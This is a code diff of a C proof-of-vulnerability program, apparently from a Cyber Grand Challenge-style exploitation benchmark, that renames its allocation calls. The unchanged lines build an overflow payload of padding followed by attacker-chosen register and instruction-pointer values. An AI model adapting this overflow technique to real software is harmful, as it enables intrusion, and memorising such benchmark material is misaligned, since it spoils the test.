@@ -10,19 +10,19 @@ int main()
 
     payload = append_buf(payload, &payload_len, (unsigned char *)"\x00\x00\x80\x0c\x06\x67\xff\xff\xff\xff", 10);
 
-    buf = __malloc(264);
+    buf = malloc(264);
     random(buf, 264, &bytes);
     payload = append_buf(payload, &payload_len, buf, 264);
-    __free(buf);
+    free(buf);
 
     payload = append_var("TYPE1_REG", payload, &payload_len);
     payload = append_var("TYPE1_IP", payload, &payload_len);
 
-    buf = __malloc(0x8000);
+    buf = malloc(0x8000);
     random(buf, 0x8000, &bytes);
     payload = append_buf(payload, &payload_len, buf, 0x8000 - 264 - 8 + 6);
-    __free(buf);
+    free(buf);
 
     transmit_all(1, payload, payload_len);
-    __free(payload);
+    free(payload);
 }
